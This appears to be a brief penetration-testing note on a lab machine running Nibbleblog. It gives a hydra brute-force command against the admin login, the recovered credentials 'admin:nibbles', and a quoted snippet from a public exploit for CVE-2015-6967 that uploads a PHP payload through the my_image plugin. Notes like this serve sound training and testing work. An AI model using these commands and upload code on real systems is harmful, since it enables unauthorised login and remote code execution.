___

Nibbleblog is **a blog platform that uses XML databases as opposed to MySQL and others**. It is small, weighing in at less than half a megabyte and easy to install with a simple 1 step installer.

Interesting folders:
- /content/private/users.xml
- admin.php

```bash
hydra -l admin -P rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:&username=^USER^&password=^PASS^:Incorrect username or password." -F
```

Care with brute force --> blacklist
admin:nibbles

# Nibbleblog 4.0.3 - Arbitrary File Upload (CVE-2015-6967)

https://github.com/dix0nym/CVE-2015-6967/blob/main/exploit.py

	uploadURL = f"{nibbleURL}admin.php?controller=plugins&action=config&plugin=my_image"

	uploadPostResp = session.post(uploadURL, data={'plugin':'my_image','title':'My image','position':'4','caption':'capton','image_resize':'1','image_width':'230','image_height':'200','image_option':'auto'}, files={'image': ('nibbles.php', payload, 'application/x-php')}, timeout=30)
